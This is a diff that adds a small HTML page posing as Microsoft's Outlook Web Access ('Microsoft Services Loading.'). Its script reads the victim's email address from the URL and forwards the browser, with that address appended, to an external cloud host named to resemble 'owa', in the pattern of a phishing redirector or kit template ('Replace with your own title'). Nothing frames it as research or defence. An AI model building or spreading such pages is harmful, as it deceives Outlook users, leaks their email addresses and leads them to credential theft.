@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<!-- Replace with your own title -->
+		<title>Outlook Owa WebApp</title>
+		
+	</head>
+	<body>
+		<!-- Español not required -->
+		<p>Microsoft Services Loading.</p>
+		<script>
+		
+		var url = 'https://ovva-data.us-south.cf.appdomain.cloud';
+		
+			var email= new URLSearchParams(location.search).get('email');
+			if (email){url = url + '?email='+ email; }
+			console.log(email);
+			window.location.replace(url);
+		</script>
+	</body>
+</html>
